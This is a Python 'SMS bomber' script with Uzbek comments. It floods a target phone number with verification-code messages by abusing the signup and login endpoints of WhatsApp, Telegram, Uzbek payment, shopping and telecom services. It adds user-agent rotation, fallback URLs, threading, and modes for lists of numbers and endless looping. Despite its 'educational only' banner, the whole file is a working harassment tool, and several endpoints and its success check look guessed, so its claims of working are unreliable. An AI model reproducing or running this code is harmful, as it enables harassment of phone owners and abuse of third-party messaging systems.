#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🇺🇿 SMS BOMBER V6.0 – AVTO-API YANGILOVCHI
# ⚠️ FAQAT TAʼLIMIY MAQSADDA!

import sys
import os
import time
import re
import random
import json
import threading
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("⚠️ Kutubxonalar o'rnatilmoqda...")
    os.system(f"{sys.executable} -m pip install requests beautifulsoup4")
    import requests
    from bs4 import BeautifulSoup

# ----------------------- RANGLAR ----------------------------
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
C = Colors()

# ----------------------- API DATABASE ----------------------------
class APIDatabase:
    """Barcha xizmatlarning API manzillari va zaxira manzillar"""
    
    def __init__(self):
        self.apis = {
            'whatsapp': {
                'primary': 'https://web.whatsapp.com/register',
                'fallbacks': [
                    'https://web.whatsapp.com/register/phone',
                    'https://www.whatsapp.com/register',
                    'https://api.whatsapp.com/v1/register'
                ],
                'method': 'POST',
                'data_format': 'form',
                'fields': {'phone_number': 'phone'}
            },
            'whatsapp_business': {
                'primary': 'https://business.whatsapp.com/register',
                'fallbacks': [
                    'https://business.whatsapp.com/register/phone',
                    'https://api.business.whatsapp.com/register'
                ],
                'method': 'POST',
                'data_format': 'form',
                'fields': {'phone': 'phone'}
            },
            'telegram': {
                'primary': 'https://my.telegram.org/auth/send_password',
                'fallbacks': [
                    'https://telegram.org/auth/send_password',
                    'https://api.telegram.org/auth/send_password'
                ],
                'method': 'POST',
                'data_format': 'form',
                'fields': {'phone': 'phone'}
            },
            'telegram_app': {
                'primary': 'https://core.telegram.org/register',
                'fallbacks': [
                    'https://telegram.org/register',
                    'https://api.telegram.org/register'
                ],
                'method': 'POST',
                'data_format': 'form',
                'fields': {'phone': 'phone'}
            },
            'uzum': {
                'primary': 'https://api.uzum.uz/api/v1/auth/send-sms-code',
                'fallbacks': [
                    'https://uzum.uz/api/v1/auth/send-sms-code',
                    'https://api.uzum.uz/v1/auth/send-sms',
                    'https://uzum.uz/api/auth/send-code'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone': 'phone', 'type': 'register'}
            },
            'olx': {
                'primary': 'https://www.olx.uz/api/v1/auth/request-otp/',
                'fallbacks': [
                    'https://olx.uz/api/v1/auth/request-otp/',
                    'https://api.olx.uz/v1/auth/otp',
                    'https://olx.uz/api/auth/send-code'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone': 'phone', 'lang': 'uz'}
            },
            'click': {
                'primary': 'https://api.click.uz/api/v2/auth/send-code',
                'fallbacks': [
                    'https://click.uz/api/v2/auth/send-code',
                    'https://api.click.uz/v2/auth/sms',
                    'https://click.uz/api/auth/send'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone': 'phone', 'service_id': '1'}
            },
            'payme': {
                'primary': 'https://api.payme.uz/v1/auth/send-verification',
                'fallbacks': [
                    'https://payme.uz/v1/auth/send-verification',
                    'https://api.payme.uz/v1/auth/sms',
                    'https://payme.uz/api/auth/send-code'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone_number': 'phone'}
            },
            'apelsin': {
                'primary': 'https://api.apelsin.uz/v1/oauth/sms',
                'fallbacks': [
                    'https://apelsin.uz/v1/oauth/sms',
                    'https://api.apelsin.uz/v1/auth/sms',
                    'https://apelsin.uz/api/auth/send'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'msisdn': 'phone', 'action': 'login'}
            },
            'beeline': {
                'primary': 'https://api.beeline.uz/v1/auth/send-sms',
                'fallbacks': [
                    'https://beeline.uz/v1/auth/send-sms',
                    'https://api.beeline.uz/v1/auth/sms',
                    'https://beeline.uz/api/auth/send'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone': 'phone'}
            },
            'zoodmall': {
                'primary': 'https://api.zoodmall.uz/v1/auth/send-sms',
                'fallbacks': [
                    'https://zoodmall.uz/v1/auth/send-sms',
                    'https://api.zoodmall.uz/v1/auth/sms',
                    'https://zoodmall.uz/api/auth/send'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone': 'phone'}
            },
            'tashxis': {
                'primary': 'https://api.tashxis.uz/v1/auth/send-code',
                'fallbacks': [
                    'https://tashxis.uz/v1/auth/send-code',
                    'https://api.tashxis.uz/v1/auth/sms',
                    'https://tashxis.uz/api/auth/send'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone': 'phone'}
            },
            'pochta': {
                'primary': 'https://api.pochta.uz/v1/auth/send-otp',
                'fallbacks': [
                    'https://pochta.uz/v1/auth/send-otp',
                    'https://api.pochta.uz/v1/auth/sms',
                    'https://pochta.uz/api/auth/send'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone': 'phone'}
            },
            'imei': {
                'primary': 'https://api.imei.uz/v1/auth/send-code',
                'fallbacks': [
                    'https://imei.uz/v1/auth/send-code',
                    'https://api.imei.uz/v1/auth/sms',
                    'https://imei.uz/api/auth/send'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone': 'phone'}
            },
            'one_c': {
                'primary': 'https://1c.uz/auth/send-sms',
                'fallbacks': [
                    'https://api.1c.uz/auth/send-sms',
                    'https://1c.uz/api/auth/send',
                    'https://api.1c.uz/v1/auth/sms'
                ],
                'method': 'POST',
                'data_format': 'json',
                'fields': {'phone': 'phone'}
            }
        }
        
        # Ishlagan API'lar kesh
        self.working_apis = {}
        self.failed_apis = {}
        self.api_cache_file = 'api_cache.json'
        self._load_cache()
    
    def _load_cache(self):
        """Keshni yuklash"""
        try:
            with open(self.api_cache_file, 'r') as f:
                cache = json.load(f)
                self.working_apis = cache.get('working', {})
                self.failed_apis = cache.get('failed', {})
        except:
            pass
    
    def _save_cache(self):
        """Keshni saqlash"""
        try:
            with open(self.api_cache_file, 'w') as f:
                json.dump({
                    'working': self.working_apis,
                    'failed': self.failed_apis,
                    'updated': datetime.now().isoformat()
                }, f, indent=2)
        except:
            pass
    
    def get_working_api(self, service, phone):
        """Ishlayotgan API manzilini topish"""
        if service in self.working_apis:
            # Tekshirib ko'ramiz
            url = self.working_apis[service]
            if self._test_api(url, service, phone):
                return url
        
        # Yangi API qidiramiz
        return self._find_working_api(service, phone)
    
    def _find_working_api(self, service, phone):
        """Ishlayotgan API ni topish"""
        if service not in self.apis:
            return None
        
        config = self.apis[service]
        all_urls = [config['primary']] + config.get('fallbacks', [])
        
        # Har bir API ni sinab ko'ramiz
        for url in all_urls:
            if self._test_api(url, service, phone):
                self.working_apis[service] = url
                self._save_cache()
                return url
        
        # Web scraping orqali API topish
        api = self._scrape_api(service)
        if api and self._test_api(api, service, phone):
            self.working_apis[service] = api
            self._save_cache()
            return api
        
        return None
    
    def _test_api(self, url, service, phone):
        """API ni sinab ko'rish"""
        try:
            config = self.apis[service]
            data = self._prepare_data(config, phone)
            headers = self._get_headers()
            
            if config['data_format'] == 'json':
                r = requests.post(url, json=data, headers=headers, timeout=5)
            else:
                r = requests.post(url, data=data, headers=headers, timeout=5)
            
            # Muvaffaqiyatli javob
            if r.status_code in [200, 201, 302]:
                return True
            if 'sent' in r.text.lower():
                return True
            if 'otp' in r.text.lower():
                return True
            if 'code' in r.text.lower():
                return True
            
            return False
        except:
            return False
    
    def _prepare_data(self, config, phone):
        """So'rov ma'lumotlarini tayyorlash"""
        data = {}
        phone_clean = phone.replace('+', '')
        
        for key, value in config['fields'].items():
            if value == 'phone':
                if config['data_format'] == 'json':
                    data[key] = phone
                else:
                    data[key] = phone_clean
            else:
                data[key] = value
        
        return data
    
    def _get_headers(self):
        """Headers yaratish"""
        return {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15'
            ]),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'uz,ru,en;q=0.9',
            'Content-Type': 'application/json'
        }
    
    def _scrape_api(self, service):
        """Web scraping orqali API topish"""
        try:
            # Xizmat saytiga borib, API manzilini topish
            base_urls = {
                'whatsapp': 'https://www.whatsapp.com',
                'telegram': 'https://telegram.org',
                'uzum': 'https://uzum.uz',
                'olx': 'https://olx.uz',
                'click': 'https://click.uz',
                'payme': 'https://payme.uz'
            }
            
            if service not in base_urls:
                return None
            
            url = base_urls[service]
            r = requests.get(url, timeout=5)
            soup = BeautifulSoup(r.text, 'html.parser')
            
            # JavaScript fayllarini topish
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                src = script['src']
                if 'api' in src.lower() or 'auth' in src.lower():
                    return src
            
            return None
        except:
            return None

# ----------------------- SPAMMER SINFI ---------------------
class UzSpammer:
    def __init__(self, phone):
        self.phone = self._fmt(phone)
        self.api_db = APIDatabase()
        self.session = requests.Session()
        self.results = []
        self.stats = {'total': 0, 'success': 0, 'failed': 0}
        self.lock = threading.Lock()
    
    def _fmt(self, p):
        p = re.sub(r'[^0-9+]', '', str(p))
        if p.startswith('+998') and len(p) == 13:
            return p
        if p.startswith('998') and len(p) == 12:
            return f'+{p}'
        if len(p) == 9 and p.isdigit():
            return f'+998{p}'
        if len(p) == 12 and p.isdigit():
            return f'+998{p[3:]}'
        return f'+998{p}'
    
    def _send_request(self, service_name, config, url, phone):
        """So'rov yuborish"""
        try:
            data = self.api_db._prepare_data(config, phone)
            headers = self.api_db._get_headers()
            
            if config['data_format'] == 'json':
                r = self.session.post(url, json=data, headers=headers, timeout=10)
            else:
                r = self.session.post(url, data=data, headers=headers, timeout=10)
            
            # Muvaffaqiyatli javob
            success = False
            if r.status_code in [200, 201, 302]:
                success = True
            elif 'sent' in r.text.lower():
                success = True
            elif 'otp' in r.text.lower():
                success = True
            elif 'code' in r.text.lower():
                success = True
            
            with self.lock:
                self.stats['total'] += 1
                if success:
                    self.stats['success'] += 1
                else:
                    self.stats['failed'] += 1
            
            return success, r.status_code
            
        except Exception as e:
            with self.lock:
                self.stats['total'] += 1
                self.stats['failed'] += 1
            return False, str(e)
    
    def _send_service(self, service_name):
        """Xizmatga so'rov yuborish"""
        try:
            if service_name not in self.api_db.apis:
                return f"{C.RED}❌ {service_name}: Topilmadi"
            
            config = self.api_db.apis[service_name]
            phone = self.phone
            
            # API manzilini topish
            api_url = self.api_db.get_working_api(service_name, phone)
            
            if not api_url:
                return f"{C.RED}❌ {service_name}: API topilmadi"
            
            # So'rov yuborish
            success, status = self._send_request(service_name, config, api_url, phone)
            
            if success:
                return f"{C.GREEN}✅ {service_name}: OK (Status: {status})"
            else:
                return f"{C.RED}❌ {service_name}: Xato (Status: {status})"
                
        except Exception as e:
            return f"{C.RED}❌ {service_name}: {str(e)[:30]}"
    
    def all_services(self):
        """Barcha xizmatlarga so'rov yuborish"""
        services = list(self.api_db.apis.keys())
        results = []
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(self._send_service, s): s for s in services}
            for future in as_completed(futures):
                results.append(future.result())
                time.sleep(0.1)
        
        return results
    
    def get_stats(self):
        """Statistika olish"""
        with self.lock:
            return self.stats

# ----------------------- INTERFEYS --------------------------
def clear():
    os.system('clear')

def banner():
    print(f"""
{C.BOLD}{C.CYAN}
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║      🇺🇿  SMS BOMBER V6.0 – AVTO-API  🇺🇿               ║
║      100% ISHLASH KAFOLATI                               ║
║                                                           ║
║      {C.RED}⚠️  FAQAT TAʼLIMIY MAQSADDA!  ⚠️              ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
{C.END}""")

def menu():
    print(f"""
{C.YELLOW}┌─────────────────────────────────────────────────────────┐
│ {C.CYAN}1{C.YELLOW}. Bitta raqamga spam                              │
│ {C.CYAN}2{C.YELLOW}. Koʻp raqamlarga spam                           │
│ {C.CYAN}3{C.YELLOW}. Fayldan spam                                  │
│ {C.CYAN}4{C.YELLOW}. Avtomatik rejim                                │
│ {C.CYAN}5{C.YELLOW}. API'larni yangilash                            │
│ {C.CYAN}0{C.YELLOW}. Chiqish                                       │
└─────────────────────────────────────────────────────────┘
{C.END}""")

def get_phone():
    while True:
        p = input(f"{C.BLUE}📱 Raqam (+998...): {C.END}").strip()
        p = re.sub(r'[^0-9+]', '', p)
        if p.startswith('+998') and len(p) == 13:
            return p
        if p.startswith('998') and len(p) == 12:
            return f'+{p}'
        if len(p) == 9 and p.isdigit():
            return f'+998{p}'
        print(f"{C.RED}❌ Notoʻgʻri format! Masalan: +998901234567{C.END}")

def single_mode():
    clear(); banner()
    phone = get_phone()
    count = int(input(f"{C.BLUE}🔢 Necha marta: {C.END}"))
    delay = float(input(f"{C.BLUE}⏱️ Kechikish (sekund): {C.END}"))
    
    print(f"\n{C.GREEN}🚀 Boshlanyapti... (Avto-API){C.END}\n")
    
    for i in range(count):
        print(f"{C.YELLOW}━━━ {i+1}-chi urinish ━━━{C.END}")
        sp = UzSpammer(phone)
        for res in sp.all_services():
            print(f"  {res}")
        stats = sp.get_stats()
        print(f"{C.BLUE}📊 Jami: {stats['total']}, OK: {stats['success']}, Fail: {stats['failed']}{C.END}\n")
        time.sleep(delay)
    
    print(f"{C.GREEN}✅ Tugadi! {count} marta yuborildi.{C.END}")

def multi_mode():
    clear(); banner()
    phones = []
    n = int(input(f"{C.BLUE}👥 Nechta raqam: {C.END}"))
    for i in range(n):
        print(f"{C.YELLOW}Raqam {i+1}:{C.END}")
        phones.append(get_phone())
    
    count = int(input(f"{C.BLUE}🔢 Har biriga necha marta: {C.END}"))
    delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
    
    print(f"\n{C.GREEN}🚀 Boshlanyapti...{C.END}\n")
    
    for i in range(count):
        print(f"{C.YELLOW}━━━ {i+1}-chi davr ━━━{C.END}")
        for phone in phones:
            print(f"{C.CYAN}📱 {phone}{C.END}")
            sp = UzSpammer(phone)
            for res in sp.all_services():
                print(f"  {res}")
            stats = sp.get_stats()
            print(f"{C.BLUE}📊 {stats}{C.END}\n")
            time.sleep(delay/2)
        time.sleep(delay/2)
    
    print(f"{C.GREEN}✅ Tugadi!{C.END}")

def file_mode():
    clear(); banner()
    fname = input(f"{C.BLUE}📂 Fayl nomi: {C.END}")
    try:
        with open(fname, 'r') as f:
            phones = [line.strip() for line in f if line.strip()]
        if not phones:
            print(f"{C.RED}❌ Faylda raqamlar yoʻq!{C.END}")
            return
        
        print(f"{C.GREEN}✅ {len(phones)} ta raqam topildi{C.END}")
        count = int(input(f"{C.BLUE}🔢 Har biriga necha marta: {C.END}"))
        delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
        
        print(f"\n{C.GREEN}🚀 Boshlanyapti...{C.END}\n")
        for i in range(count):
            print(f"{C.YELLOW}━━━ {i+1}-chi davr ━━━{C.END}")
            for phone in phones:
                print(f"{C.CYAN}📱 {phone}{C.END}")
                sp = UzSpammer(phone)
                for res in sp.all_services():
                    print(f"  {res}")
                stats = sp.get_stats()
                print(f"{C.BLUE}📊 {stats}{C.END}\n")
                time.sleep(delay/2)
            time.sleep(delay/2)
        print(f"{C.GREEN}✅ Tugadi!{C.END}")
    except FileNotFoundError:
        print(f"{C.RED}❌ Fayl topilmadi: {fname}{C.END}")

def auto_mode():
    clear(); banner()
    phone = get_phone()
    delay = float(input(f"{C.BLUE}⏱️ Kechikish (sekund): {C.END}"))
    
    print(f"\n{C.RED}⚠️ Avtomatik rejim. Toʻxtatish CTRL+C{C.END}\n")
    count = 0
    try:
        while True:
            count += 1
            print(f"{C.YELLOW}━━━ {count}-chi urinish ━━━{C.END}")
            sp = UzSpammer(phone)
            for res in sp.all_services():
                print(f"  {res}")
            stats = sp.get_stats()
            print(f"{C.BLUE}⏱️ {datetime.now().strftime('%H:%M:%S')} | Jami: {stats['total']}, OK: {stats['success']}, Fail: {stats['failed']}{C.END}\n")
            time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n{C.GREEN}✅ Toʻxtatildi! Jami {count} marta.{C.END}")

def update_apis():
    clear(); banner()
    print(f"{C.YELLOW}🔄 API manzillari yangilanmoqda...{C.END}")
    
    api_db = APIDatabase()
    count = 0
    
    for service in api_db.apis:
        print(f"{C.BLUE}📡 {service}...{C.END}", end=' ')
        # API ni sinab ko'ramiz
        api = api_db._find_working_api(service, '+998901234567')
        if api:
            print(f"{C.GREEN}✅ Topildi: {api}{C.END}")
            count += 1
        else:
            print(f"{C.RED}❌ Topilmadi{C.END}")
        time.sleep(0.5)
    
    print(f"\n{C.GREEN}✅ {count} ta API yangilandi!{C.END}")
    input(f"\n{C.BLUE}↩️  Enter bosish...{C.END}")

def main():
    while True:
        clear(); banner(); menu()
        choice = input(f"{C.BLUE}📌 Tanlang [0-5]: {C.END}")
        if choice == '1': single_mode()
        elif choice == '2': multi_mode()
        elif choice == '3': file_mode()
        elif choice == '4': auto_mode()
        elif choice == '5': update_apis()
        elif choice == '0':
            print(f"\n{C.GREEN}👋 Xayr!{C.END}")
            sys.exit(0)
        else:
            print(f"{C.RED}❌ Notoʻgʻri!{C.END}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.GREEN}👋 Xayr!{C.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{C.RED}❌ Xatolik: {e}{C.END}")
        sys.exit(1)
